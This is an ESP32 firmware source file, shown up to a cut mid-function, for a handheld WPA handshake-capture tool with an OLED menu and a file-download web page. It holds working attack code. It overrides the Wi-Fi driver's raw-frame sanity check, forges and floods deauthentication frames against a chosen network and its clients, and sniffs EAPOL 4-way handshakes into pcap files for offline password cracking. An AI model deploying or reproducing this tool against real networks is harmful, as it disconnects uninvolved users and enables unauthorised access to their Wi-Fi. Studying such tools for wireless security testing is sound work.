#include "handshake_capture.h"
#include "utils.h"
#include "icons.h"
#include "menu.h"
#include "config.h"
#include "pins.h"
#include <U8g2lib.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <SPIFFS.h>
#include <cstring>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern int selectedItem;
extern int currentScreen;

// =================================================
// BRUCE-STYLE BYPASS for ESP32-S3 - REQUIRED FOR DEAUTH
// =================================================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// =================================================
// DEAUTH PACKET STRUCTURE
// =================================================
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} __attribute__((packed)) DeauthPacket;

// =================================================
// NETWORK STRUCTURE
// =================================================
typedef struct {
    String ssid;
    uint8_t bssid[6];
    int ch;
    int rssi;
    String encryption;
} Network;

// =================================================
// CLIENT STRUCTURE
// =================================================
typedef struct {
    uint8_t mac[6];
    int rssi;
    bool active;
    unsigned long last_seen;
    bool is_connected;
} ClientInfo;

// =================================================
// GLOBAL VARIABLES
// =================================================
Network networks[20];
Network target;
ClientInfo clients[20];
int clientCount = 0;
int selectedClientIndex = 0;

uint8_t* pcap_buffer = nullptr;
size_t pcap_size = 0;
bool capture_completed = false;
bool beacon_captured = false;

int eapol_count = 0;
bool is_capturing = false;
bool with_deauth = false;
unsigned long last_deauth_time = 0;
int deauth_count = 0;
bool promiscuous_enabled = false;
unsigned long capture_start_time = 0;
int total_frames_captured = 0;
unsigned long last_eapol_time = 0;
bool auth_captured = false;
bool assoc_captured = false;
bool handshake_started = false;
int eapol_types[4] = {0, 0, 0, 0};

// =================================================
// DEAUTH SETTINGS
// =================================================
const int DEAUTH_INTERVAL_MS = 50;
bool deauth_active = false;
bool inSubMenu = false;
int subMenuType = 0;
bool wifi_initialized = false;
uint16_t deauth_seq = 0;
int selectedNetworkIndex = 0;
unsigned long lastMonitorUpdate = 0;

// Menu state
int handshakeMenuIndex = 0;
int handshakeMenuLevel = 0;
int clientListIndex = 0;
int clientEmptyIndex = 0;

// Broadcast MAC
const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// =================================================
// MENU ITEMS
// =================================================
const char* handshakeMainItems[] = {
    "📡 Scan Networks",
    "🎯 Select Target",
    "👥 Select Client",
    "🔴 Start w/ Deauth",
    "🟢 Start w/o Deauth",
    "⏹️ Stop Capture",
    "📁 List Files",
    "⬅️ Back"
};
const int handshakeMainCount = 8;

// =================================================
// WEB SERVER
// =================================================
WiFiServer server(80);
bool webServerActive = false;

// =================================================
// FORWARD DECLARATIONS
// =================================================
void handshakeScanNetworks();
void handshakeStartCapture(bool deauth);
void handshakeStartCaptureWithClient(bool deauth);
void handshakeStopCapture();
void handshakeSaveHandshake();
void handshakePromiscuousRxCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void handshakePcapInit();
void handshakePcapAppend(const uint8_t* frame, size_t len, int channel, int rssi, uint32_t timestamp);
void handshakeSendDeauth(const uint8_t* clientMac);
void handshakeSendBroadcastDeauth();
void handshakeDeauthClient(const uint8_t* clientMac);
String handshakeSanitizeFilename(String input);
void showHandshakeMainMenu();
void showHandshakeNetworkList();
void showHandshakeFileList();
void showHandshakeMonitor(bool deauth);
void showClientList();
void handleHandshakeButtons();
void selectHandshakeNetwork();
void updateHandshakeMonitor();
void drawHandshakeHeader(const char* title, bool active);
void checkHandshakeComplete();

// =================================================
// UI DRAW FUNCTIONS
// =================================================

void drawHandshakeHeader(const char* title, bool active) {
    u8g2.drawXBMP(2, 1, 10, 10, icon_wifi);
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setCursor(16, 10);
    u8g2.print(title);
    u8g2.setCursor(115, 10);
    u8g2.print(active ? "●" : "○");
    u8g2.drawLine(0, 13, 128, 13);
}

void showHandshakeMainMenu() {
    handshakeMenuLevel = 0;
    inSubMenu = false;
    subMenuType = 0;
    handshakeMenuIndex = 0;
    clientListIndex = 0;
    clientEmptyIndex = 0;
    drawScrollingMenu(handshakeMainItems, handshakeMainCount, handshakeMenuIndex, 4, "Handshake Capture", 18);
}

void showHandshakeNetworkList() {
    inSubMenu = true;
    subMenuType = 1;
    handshakeMenuLevel = 1;
    
    int count = 0;
    for (int i = 0; i < 20; i++) {
        if (networks[i].ssid != "") count++;
    }
    
    if (count == 0) {
        const char* emptyItems[] = {"No networks found", "Press BACK"};
        drawScrollingMenu(emptyItems, 2, 0, 4, "Select Network", 18);
        return;
    }
    
    static String displayNames[25];
    const char* items[25];
    int itemCount = 0;
    
    for (int i = 0; i < 20; i++) {
        if (networks[i].ssid != "") {
            String ssid = networks[i].ssid;
            if (ssid.length() > 14) ssid = ssid.substring(0, 12) + "..";
            displayNames[itemCount] = ssid + " CH" + String(networks[i].ch);
            items[itemCount] = displayNames[itemCount].c_str();
            itemCount++;
        }
    }
    
    displayNames[itemCount] = "< Back";
    items[itemCount] = displayNames[itemCount].c_str();
    itemCount++;
    
    if (handshakeMenuIndex >= itemCount) {
        handshakeMenuIndex = itemCount - 1;
    }
    if (handshakeMenuIndex < 0) {
        handshakeMenuIndex = 0;
    }
    
    drawScrollingMenu(items, itemCount, handshakeMenuIndex, 4, "Select Network", 18);
}

void showClientList() {
    inSubMenu = true;
    subMenuType = 4;
    handshakeMenuLevel = 4;
    
    if (clientCount == 0) {
        const char* emptyItems[] = {"No clients found", "Scan for clients", "< Back"};
        if (clientEmptyIndex >= 3) clientEmptyIndex = 2;
        if (clientEmptyIndex < 0) clientEmptyIndex = 0;
        drawScrollingMenu(emptyItems, 3, clientEmptyIndex, 4, "Select Client", 18);
        return;
    }
    
    static String clientStrings[25];
    const char* clientItems[25];
    int itemCount = 0;
    
    for (int i = 0; i < clientCount && i < 20; i++) {
        char macStr[18];
        sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            clients[i].mac[0], clients[i].mac[1], clients[i].mac[2],
            clients[i].mac[3], clients[i].mac[4], clients[i].mac[5]);
        String status = clients[i].is_connected ? " ✅" : "";
        clientStrings[itemCount] = String(macStr) + " R:" + String(clients[i].rssi) + status;
        clientItems[itemCount] = clientStrings[itemCount].c_str();
        itemCount++;
    }
    
    clientStrings[itemCount] = "< Back";
    clientItems[itemCount] = clientStrings[itemCount].c_str();
    itemCount++;
    
    if (clientListIndex >= itemCount) {
        clientListIndex = itemCount - 1;
    }
    if (clientListIndex < 0) {
        clientListIndex = 0;
    }
    
    drawScrollingMenu(clientItems, itemCount, clientListIndex, 4, "Select Client", 18);
}

void showHandshakeFileList() {
    inSubMenu = true;
    subMenuType = 2;
    handshakeMenuLevel = 2;
    
    static String displayNames[15];
    const char* items[15];
    int itemCount = 0;
    
    displayNames[itemCount] = webServerActive ? "🌐 Web: 192.168.4.1" : "🌐 Web: Starting...";
    items[itemCount] = displayNames[itemCount].c_str();
    itemCount++;
    
    File root = SPIFFS.open("/");
    int fileCount = 0;
    if (root) {
        File file = root.openNextFile();
        while (file) {
            String name = file.name();
            if (name.endsWith(".cap")) {
                if (name.startsWith("/")) name = name.substring(1);
                if (fileCount < 10) {
                    if (name.length() > 16) name = name.substring(0, 14) + "..";
                    displayNames[itemCount] = "📄 " + name;
                    items[itemCount] = displayNames[itemCount].c_str();
                    itemCount++;
                    fileCount++;
                }
            }
            file = root.openNextFile();
        }
        root.close();
    }
    
    if (fileCount == 0) {
        displayNames[itemCount] = "📭 No files captured";
        items[itemCount] = displayNames[itemCount].c_str();
        itemCount++;
    }
    
    displayNames[itemCount] = "< Back";
    items[itemCount] = displayNames[itemCount].c_str();
    itemCount++;
    
    if (handshakeMenuIndex >= itemCount) {
        handshakeMenuIndex = itemCount - 1;
    }
    if (handshakeMenuIndex < 0) {
        handshakeMenuIndex = 0;
    }
    
    drawScrollingMenu(items, itemCount, handshakeMenuIndex, 4, "📁 Files", 18);
}

void showHandshakeMonitor(bool deauth) {
    inSubMenu = true;
    subMenuType = 3;
    handshakeMenuLevel = 3;
    handshakeMenuIndex = 0;
    clientListIndex = 0;
    clientEmptyIndex = 0;
    
    String items[12];
    int itemCount = 0;
    
    if (target.ssid != "") {
        String ssid = target.ssid;
        if (ssid.length() > 14) ssid = ssid.substring(0, 12) + "..";
        items[itemCount] = "🎯 " + ssid;
    } else {
        items[itemCount] = "🎯 No Target";
    }
    itemCount++;
    
    items[itemCount] = "📡 CH: " + String(target.ch);
    itemCount++;
    
    items[itemCount] = "🔑 EAPOL: " + String(eapol_count) + "/4";
    itemCount++;
    
    items[itemCount] = "📦 Frames: " + String(total_frames_captured);
    itemCount++;
    
    items[itemCount] = "👥 Clients: " + String(clientCount);
    itemCount++;
    
    if (deauth) {
        items[itemCount] = "⚔️ Deauth: " + String(deauth_count);
        itemCount++;
    }
    
    if (is_capturing) {
        unsigned long elapsed = (millis() - capture_start_time) / 1000;
        items[itemCount] = "⏱️ " + String(elapsed) + "s";
        itemCount++;
    }
    
    if (is_capturing) {
        items[itemCount] = "🔴 CAPTURING";
    } else if (capture_completed) {
        items[itemCount] = "✅ Saved!";
    } else {
        items[itemCount] = "⚪ IDLE";
    }
    itemCount++;
    
    static const char* monitorItems[12];
    static String monitorStrings[12];
    for (int i = 0; i < itemCount; i++) {
        monitorStrings[i] = items[i];
        monitorItems[i] = monitorStrings[i].c_str();
    }
    
    const char* title = deauth ? "⚔️ With Deauth" : "🟢 No Deauth";
    drawScrollingMenu(monitorItems, itemCount, 0, 4, title, 18);
}

// =================================================
// SELECT NETWORK FUNCTION
// =================================================
void selectHandshakeNetwork() {
    int count = 0;
    for (int i = 0; i < 20; i++) {
        if (networks[i].ssid != "") {
            if (count == handshakeMenuIndex) {
                target = networks[i];
                inSubMenu = false;
                subMenuType = 0;
                handshakeMenuLevel = 0;
                handshakeMenuIndex = 0;
                clientListIndex = 0;
                clientEmptyIndex = 0;
                showHandshakeMainMenu();
                return;
            }
            count++;
        }
    }
}

// =================================================
// UPDATE MONITOR
// =================================================
void updateHandshakeMonitor() {
    if (subMenuType != 3) return;
    if (millis() - lastMonitorUpdate < 1000) return;
    lastMonitorUpdate = millis();
    
    if (inSubMenu && subMenuType == 3) {
        bool deauth = with_deauth;
        showHandshakeMonitor(deauth);
    }
}

// =================================================
// WEB SERVER FUNCTIONS
// =================================================
void startWebServer() {
    if (webServerActive) return;
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP("ESP32-Capture", "12345678");
    delay(100);
    server.begin();
    webServerActive = true;
    showHandshakeFileList();
}

void stopWebServer() {
    if (!webServerActive) return;
    
    server.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    webServerActive = false;
}

void handleWebServer() {
    if (!webServerActive) return;
    
    WiFiClient client = server.available();
    if (!client) return;
    
    String request = "";
    while (client.connected() && !client.available()) {
        delay(1);
    }
    
    if (client.available()) {
        request = client.readStringUntil('\r');
        client.readStringUntil('\n');
    }
    
    bool isDownload = false;
    String downloadFile = "";
    if (request.indexOf("GET /download/") >= 0) {
        isDownload = true;
        int start = request.indexOf("/download/") + 10;
        int end = request.indexOf(" HTTP");
        if (end > start) {
            downloadFile = request.substring(start, end);
            downloadFile.trim();
        }
    }
    
    client.println("HTTP/1.1 200 OK");
    
    if (isDownload) {
        client.println("Content-Type: application/octet-stream");
        client.print("Content-Disposition: attachment; filename=\"");
        client.print(downloadFile);
        client.println("\"");
        client.println("Connection: close");
        client.println();
        
        File file = SPIFFS.open("/" + downloadFile, "r");
        if (file) {
            while (file.available()) {
                client.write(file.read());
            }
            file.close();
        }
        client.stop();
        return;
    }
    
    client.println("Content-Type: text/html");
    client.println("Connection: close");
    client.println();
    
    client.println("<!DOCTYPE HTML>");
    client.println("<html><head>");
    client.println("<meta charset='UTF-8'>");
    client.println("<meta name='viewport' content='width=device-width, initial-scale=1'>");
    client.println("<title>Handshake Files</title>");
    client.println("<style>");
    client.println("body{font-family:Arial;margin:20px;background:#1a1a2e;color:#eee;}");
    client.println(".container{max-width:800px;margin:auto;background:#16213e;padding:20px;border-radius:10px;}");
    client.println("h1{color:#e94560;text-align:center;}");
    client.println(".file{background:#0f3460;padding:12px;margin:8px 0;border-radius:5px;display:flex;justify-content:space-between;align-items:center;}");
    client.println(".file a{color:#e94560;text-decoration:none;font-weight:bold;}");
    client.println(".file a:hover{color:#ff6b6b;}");
    client.println(".file-size{color:#888;font-size:12px;}");
    client.println(".status{text-align:center;color:#4ecdc4;margin:10px 0;}");
    client.println(".back{display:block;text-align:center;margin-top:20px;color:#4ecdc4;text-decoration:none;}");
    client.println(".target{text-align:center;color:#ffd93d;margin:5px 0;}");
    client.println("</style></head><body>");
    client.println("<div class='container'>");
    client.println("<h1>📁 Captured Handshakes</h1>");
    
    client.println("<div class='target'>");
    if (target.ssid != "") {
        client.print("🎯 Target: ");
        client.print(target.ssid);
        client.print(" (CH");
        client.print(target.ch);
        client.println(")");
    }
    client.println("</div>");
    
    client.println("<div class='status'>");
    if (is_capturing) {
        client.print("🔴 Capturing... EAPOL: ");
        client.print(eapol_count);
        client.println("/4");
    } else if (capture_completed) {
        client.println("✅ Handshake Captured!");
    } else {
        client.println("⚪ Ready for capture");
    }
    client.println("</div>");
    
    File root = SPIFFS.open("/");
    int fileCount = 0;
    if (root) {
        File file = root.openNextFile();
        while (file) {
            String name = file.name();
            if (name.endsWith(".cap")) {
                if (name.startsWith("/")) name = name.substring(1);
                client.print("<div class='file'>");
                client.print("<a href='/download/");
                client.print(name);
                client.print("'>📄 ");
                client.print(name);
                client.print("</a>");
                client.print("<span class='file-size'>");
                client.print(file.size());
                client.print(" bytes</span>");
                client.println("</div>");
                fileCount++;
            }
            file = root.openNextFile();
        }
        root.close();
    }
    
    if (fileCount == 0) {
        client.println("<div class='file' style='text-align:center;color:#888;'>📭 No handshake files captured yet</div>");
    }
    
    client.println("<a href='/' class='back'>🔄 Refresh</a>");
    client.println("</div></body></html>");
    client.stop();
}

// =================================================
// PCAP INITIALIZATION
// =================================================
void handshakePcapInit() {
    if (pcap_buffer) {
        free(pcap_buffer);
        pcap_buffer = nullptr;
    }
    pcap_size = 0;
    pcap_buffer = (uint8_t*)malloc(131072);
    if (!pcap_buffer) {
        Serial.println("Failed to allocate PCAP buffer");
        return;
    }
    
    uint32_t magic = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    int32_t thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 65535;
    uint32_t network = 127;
    
    memcpy(pcap_buffer + pcap_size, &magic, 4); pcap_size += 4;
    memcpy(pcap_buffer + pcap_size, &version_major, 2); pcap_size += 2;
    memcpy(pcap_buffer + pcap_size, &version_minor, 2); pcap_size += 2;
    memcpy(pcap_buffer + pcap_size, &thiszone, 4); pcap_size += 4;
    memcpy(pcap_buffer + pcap_size, &sigfigs, 4); pcap_size += 4;
    memcpy(pcap_buffer + pcap_size, &snaplen, 4); pcap_size += 4;
    memcpy(pcap_buffer + pcap_size, &network, 4); pcap_size += 4;
}

void handshakePcapAppend(const uint8_t* frame, size_t len, int channel, int rssi, uint32_t timestamp) {
    if (!frame || len == 0 || !pcap_buffer || capture_completed) return;
    if (pcap_size + 1024 > 131072) return;
    
    uint8_t radiotap[24] = {
        0x00, 0x00, 0x18, 0x00,
        0x0F, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x02,
        (uint8_t)(2407 + channel * 5), 0x00,
        0x80, 0x00,
        (uint8_t)(rssi), 0x01
    };
    
    size_t total_len = 24 + len;
    uint8_t* combined = (uint8_t*)malloc(total_len);
    if (!combined) return;
    
    memcpy(combined, radiotap, 24);
    memcpy(combined + 24, frame, len);
    
    uint32_t ts_sec = timestamp;
    uint32_t ts_usec = (millis() % 1000) * 1000;
    uint32_t incl_len = total_len;
    uint32_t orig_len = total_len;
    
    memcpy(pcap_buffer + pcap_size, &ts_sec, 4); pcap_size += 4;
    memcpy(pcap_buffer + pcap_size, &ts_usec, 4); pcap_size += 4;
    memcpy(pcap_buffer + pcap_size, &incl_len, 4); pcap_size += 4;
    memcpy(pcap_buffer + pcap_size, &orig_len, 4); pcap_size += 4;
    memcpy(pcap_buffer + pcap_size, combined, total_len);
    pcap_size += total_len;
    
    free(combined);
}

void handshakeSaveHandshake() {
    if (!pcap_buffer || pcap_size == 0) {
        Serial.println("No data to save");
        return;
    }
    if (capture_completed) return;
    
    String timestamp = String(millis() / 1000);
    String cleanSSID = handshakeSanitizeFilename(target.ssid);
    String filename = "/handshake_" + cleanSSID + "_" + timestamp + ".cap";
    
    // If filename is too long, use just timestamp
    if (filename.length() > 64) {
        filename = "/handshake_" + timestamp + ".cap";
    }
    
    Serial.println("========================================");
    Serial.printf("💾 Saving capture to: %s\n", filename.c_str());
    Serial.printf("📊 EAPOL frames: %d\n", eapol_count);
    Serial.printf("📊 Total frames: %d\n", total_frames_captured);
    Serial.printf("📊 Buffer size: %d bytes\n", pcap_size);
    Serial.println("========================================");
    
    if (!SPIFFS.begin(false)) {
        Serial.println("SPIFFS mount failed");
        return;
    }
    
    if (SPIFFS.exists(filename)) {
        SPIFFS.remove(filename);
    }
    
    File file = SPIFFS.open(filename, FILE_WRITE);
    if (!file) {
        filename = "/handshake_" + timestamp + ".cap";
        if (SPIFFS.exists(filename)) {
            SPIFFS.remove(filename);
        }
        file = SPIFFS.open(filename, FILE_WRITE);
        if (!file) {
            Serial.println("Failed to create file!");
            return;
        }
    }
    
    size_t written = file.write(pcap_buffer, pcap_size);
    file.close();
    
    if (written == pcap_size) {
        Serial.printf("✅ Saved %s (%d bytes)\n", filename.c_str(), pcap_size);
        capture_completed = true;
        showHandshakeMainMenu();
    } else {
        Serial.printf("❌ Error writing file. Written %d of %d bytes\n", written, pcap_size);
    }
}

// =================================================
// BROADCAST DEAUTH
// =================================================
void handshakeSendBroadcastDeauth() {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    DeauthPacket deauth;
    deauth.frame_control = 0x00C0;
    deauth.duration = 0x0000;
    memcpy(deauth.dest, broadcast, 6);
    memcpy(deauth.src, target.bssid, 6);
    memcpy(deauth.bssid, target.bssid, 6);
    deauth.seq_ctrl = deauth_seq++;
    deauth.reason_code = 0x0007;
    
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&deauth, sizeof(DeauthPacket), false);
    if (err == ESP_OK) {
        deauth_count++;
    }
}

void handshakeSendDeauth(const uint8_t* clientMac) {
    if (!clientMac) return;
    
    DeauthPacket deauth;
    deauth.frame_control = 0x00C0;
    deauth.duration = 0x0000;
    memcpy(deauth.dest, clientMac, 6);
    memcpy(deauth.src, target.bssid, 6);
    memcpy(deauth.bssid, target.bssid, 6);
    deauth.seq_ctrl = deauth_seq++;
    deauth.reason_code = 0x0007;
    
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&deauth, sizeof(DeauthPacket), false);
    if (err == ESP_OK) {
        deauth_count++;
    }
}

void handshakeDeauthClient(const uint8_t* clientMac) {
    if (!clientMac) return;
    
    Serial.print("🔴 Deauthing client: ");
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X:", clientMac[i]);
    }
    Serial.println();
    
    for (int i = 0; i < 20; i++) {
        DeauthPacket deauth;
        deauth.frame_control = 0x00C0;
        deauth.duration = 0x0000;
        memcpy(deauth.dest, clientMac, 6);
        memcpy(deauth.src, target.bssid, 6);
        memcpy(deauth.bssid, target.bssid, 6);
        deauth.seq_ctrl = deauth_seq++;
        deauth.reason_code = 0x0007;
        
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, (uint8_t*)&deauth, sizeof(DeauthPacket), false);
        if (err == ESP_OK) {
            deauth_count++;
            Serial.print(".");
        }
        delay(1);
    }
    Serial.println(" ✅ Deauth sent!");
}

// =================================================
// CHECK HANDSHAKE COMPLETE
// =================================================
void checkHandshakeComplete() {
    // Check if we have all 4 EAPOL types OR at least 4 EAPOL frames
    bool has_all_types = true;
    int type_count = 0;
    for (int i = 0; i < 4; i++) {
        if (eapol_types[i] == 0) {
            has_all_types = false;
        } else {
            type_count++;
        }
    }
    
    // Auto-stop conditions:
    // 1. All 4 EAPOL types captured (M1, M2, M3, M4) OR
    // 2. At least 4 EAPOL frames with at least 2 different types
    bool should_stop = false;
    
    if (has_all_types && eapol_count >= 4) {
        should_stop = true;
        Serial.println("✅ All 4 EAPOL types captured!");
    } else if (eapol_count >= 6) {
        should_stop = true;
        Serial.println("✅ Sufficient EAPOL frames captured (6+)");
    } else if (eapol_count >= 4 && type_count >= 2) {
        should_stop = true;
        Serial.println("✅ 4+ EAPOL frames with 2+ types captured");
    }
    
    if (should_stop && !capture_completed) {
        deauth_active = false;
        Serial.println("========================================");
        Serial.println("*** COMPLETE 4-WAY HANDSHAKE CAPTURED! ***");
        Serial.printf("📊 Total EAPOL frames: %d\n", eapol_count);
        Serial.printf("📊 EAPOL types: M1=%d, M2=%d, M3=%d, M4=%d\n", 
            eapol_types[0], eapol_types[1], eapol_types[2], eapol_types[3]);
        Serial.printf("📊 Total frames captured: %d\n", total_frames_captured);
        Serial.println("========================================");
        handshakeSaveHandshake();
        is_capturing = false;
        capture_completed = true;
        if (promiscuous_enabled) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            promiscuous_enabled = false;
        }
        showHandshakeMainMenu();
    }
}

// =================================================
// PROMISCUOUS CALLBACK
// =================================================
void IRAM_ATTR handshakePromiscuousRxCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!is_capturing || capture_completed) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int channel = pkt->rx_ctrl.channel;
    int rssi = pkt->rx_ctrl.rssi;
    uint32_t timestamp = millis() / 1000;
    
    if (len < 24) return;
    
    uint8_t frame_control = payload[0];
    uint8_t frame_type = (frame_control >> 2) & 0x03;
    uint8_t frame_subtype = (frame_control >> 4) & 0x0F;
    
    uint8_t* addr1 = &payload[4];
    uint8_t* addr2 = &payload[10];
    uint8_t* addr3 = &payload[16];
    
    bool is_target = false;
    if (memcmp(addr3, target.bssid, 6) == 0) is_target = true;
    else if (memcmp(addr2, target.bssid, 6) == 0) is_target = true;
    else if (memcmp(addr1, target.bssid, 6) == 0) is_target = true;
    
    // Detect clients from data frames
    if (frame_type == 0x02) {
        if (!is_target) return;
        
        if (memcmp(addr2, target.bssid, 6) != 0 && memcmp(addr1, target.bssid, 6) == 0) {
            bool found = false;
            for (int i = 0; i < clientCount; i++) {
                if (memcmp(clients[i].mac, addr2, 6) == 0) {
                    found = true;
                    clients[i].active = true;
                    clients[i].rssi = rssi;
                    clients[i].last_seen = millis();
                    clients[i].is_connected = true;
                    break;
                }
            }
            if (!found && clientCount < 20) {
                memcpy(clients[clientCount].mac, addr2, 6);
                clients[clientCount].rssi = rssi;
                clients[clientCount].active = true;
                clients[clientCount].last_seen = millis();
                clients[clientCount].is_connected = true;
                clientCount++;
                Serial.printf("📱 Connected client: %02X:%02X:%02X:%02X:%02X:%02X (RSSI: %d)\n",
                    addr2[0], addr2[1], addr2[2], addr2[3], addr2[4], addr2[5], rssi);
            }
        }
        
        // EAPOL detection - scan for 0x888E
        bool eapol_found = false;
        int eapol_offset = -1;
        
        // Check for EAPOL marker 0x888E
        for (int offset = 24; offset < len - 1 && offset < 60; offset++) {
            if (payload[offset] == 0x88 && payload[offset + 1] == 0x8E) {
                eapol_found = true;
                eapol_offset = offset;
                break;
            }
        }
        
        if (eapol_found) {
            eapol_count++;
            last_eapol_time = millis();
            handshake_started = true;
            
            handshakePcapAppend(payload, len, channel, rssi, timestamp);
            total_frames_captured++;
            
            int eapol_type = 0;
            if (eapol_offset + 4 < len) {
                eapol_type = payload[eapol_offset + 2];
                if (eapol_type >= 1 && eapol_type <= 4) {
                    eapol_types[eapol_type - 1] = 1;
                    Serial.printf("📦 EAPOL #%d (type:%d, offset:%d, size:%d, RSSI:%d)\n", 
                        eapol_count, eapol_type, eapol_offset, len, rssi);
                }
            }
            
            checkHandshakeComplete();
            return;
        }
        return;
    }
    
    // Capture beacon
    if (frame_type == 0x00 && frame_subtype == 0x08) {
        if (is_target || memcmp(addr3, target.bssid, 6) == 0) {
            if (!beacon_captured) {
                beacon_captured = true;
                Serial.println("📡 Beacon captured");
                handshakePcapAppend(payload, len, channel, rssi, timestamp);
                total_frames_captured++;
            }
        }
        return;
    }
    
    // Capture authentication
    if (frame_type == 0x00 && frame_subtype == 0x0B) {
        if (is_target) {
            Serial.println("🔐 Auth frame captured!");
            handshakePcapAppend(payload, len, channel, rssi, timestamp);
            total_frames_captured++;
            auth_captured = true;
            
            if (memcmp(addr2, target.bssid, 6) != 0) {
                bool found = false;
                for (int i = 0; i < clientCount; i++) {
                    if (memcmp(clients[i].mac, addr2, 6) == 0) {
                        found = true;
                        clients[i].active = true;
                        clients[i].rssi = rssi;
                        clients[i].last_seen = millis();
                        clients[i].is_connected = true;
                        break;
                    }
                }
                if (!found && clientCount < 20) {
                    memcpy(clients[clientCount].mac, addr2, 6);
                    clients[clientCount].rssi = rssi;
                    clients[clientCount].active = true;
                    clients[clientCount].last_seen = millis();
                    clients[clientCount].is_connected = true;
                    clientCount++;
                }
            }
        }
        return;
    }
    
    // Capture association request
    if (frame_type == 0x00 && frame_subtype == 0x00) {
        if (is_target) {
            Serial.println("📋 Assoc Request captured!");
            handshakePcapAppend(payload, len, channel, rssi, timestamp);
            total_frames_captured++;
            assoc_captured = true;
            
            if (memcmp(addr2, target.bssid, 6) != 0) {
                bool found = false;
                for (int i = 0; i < clientCount; i++) {
                    if (memcmp(clients[i].mac, addr2, 6) == 0) {
                        found = true;
                        clients[i].active = true;
                        clients[i].rssi = rssi;
                        clients[i].last_seen = millis();
                        clients[i].is_connected = true;
                        break;
                    }
                }
                if (!found && clientCount < 20) {
                    memcpy(clients[clientCount].mac, addr2, 6);
                    clients[clientCount].rssi = rssi;
                    clients[clientCount].active = true;
                    clients[clientCount].last_seen = millis();
                    clients[clientCount].is_connected = true;
                    clientCount++;
                }
            }
        }
        return;
    }
    
    // Detect clients from probe requests
    if (frame_type == 0x00 && frame_subtype == 0x04) {
        if (memcmp(addr3, target.bssid, 6) == 0 || memcmp(addr3, broadcast_mac, 6) == 0) {
            if (memcmp(addr2, target.bssid, 6) != 0) {
                bool found = false;
                for (int i = 0; i < clientCount; i++) {
                    if (memcmp(clients[i].mac, addr2, 6) == 0) {
                        found = true;
                        clients[i].active = true;
                        clients[i].rssi = rssi;
                        clients[i].last_seen = millis();
                        break;
                    }
                }
                if (!found && clientCount < 20) {
                    memcpy(clients[clientCount].mac, addr2, 6);
                    clients[clientCount].rssi = rssi;
                    clients[clientCount].active = true;
                    clients[clientCount].last_seen = millis();
                    clients[clientCount].is_connected = false;
                    clientCount++;
                    if (clientCount % 5 == 0) {
                        Serial.printf("📱 Found %d clients (probe)\n", clientCount);
                    }
                }
            }
        }
        return;
    }
}

void handshakeScanNetworks() {
    Serial.println("Scanning networks...");
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    drawHandshakeHeader("Scanning", false);
    CenteredStr(35, "Scanning Networks...");
    u8g2.sendBuffer();
    
    if (promiscuous_enabled) {
        esp_wifi_set_promiscuous(false);
        promiscuous_enabled = false;
        delay(100);
    }
    
    WiFi.scanDelete();
    int n = WiFi.scanNetworks(false, true);
    
    if (n == 0) {
        Serial.println("No networks found");
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        drawHandshakeHeader("Scan Complete", false);
        CenteredStr(35, "No networks found!");
        u8g2.sendBuffer();
        delay(1500);
        showHandshakeMainMenu();
        return;
    }
    
    memset(networks, 0, sizeof(networks));
    
    for (int i = 0; i < min(n, 20); i++) {
        String ssid = WiFi.SSID(i);
        networks[i].ssid = ssid.isEmpty() ? "<HIDDEN>" : ssid;
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        networks[i].ch = WiFi.channel(i);
        networks[i].rssi = WiFi.RSSI(i);
        
        wifi_auth_mode_t encryption = WiFi.encryptionType(i);
        if (encryption == WIFI_AUTH_OPEN) networks[i].encryption = "Open";
        else if (encryption == WIFI_AUTH_WEP) networks[i].encryption = "WEP";
        else if (encryption == WIFI_AUTH_WPA_PSK) networks[i].encryption = "WPA";
        else if (encryption == WIFI_AUTH_WPA2_PSK) networks[i].encryption = "WPA2";
        else if (encryption == WIFI_AUTH_WPA_WPA2_PSK) networks[i].encryption = "WPA/WPA2";
        else networks[i].encryption = "WPA2 Ent";
    }
    
    WiFi.scanDelete();
    Serial.printf("Found %d networks\n", n);
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    drawHandshakeHeader("Scan Complete", false);
    char resultStr[30];
    sprintf(resultStr, "Found %d networks", n);
    CenteredStr(35, resultStr);
    u8g2.sendBuffer();
    delay(1500);
    showHandshakeMainMenu();
}

void handshakeStartCapture(bool deauth) {
    if (target.ssid == "") {
        Serial.println("No target selected.");
        return;
    }
    if (is_capturing) return;
    
    eapol_count = 0;
    with_deauth = deauth;
    is_capturing = true;
    deauth_active = deauth;
    deauth_count = 0;
    deauth_seq = 0;
    last_deauth_time = 0;
    beacon_captured = false;
    capture_completed = false;
    capture_start_time = millis();
    last_eapol_time = 0;
    total_frames_captured = 0;
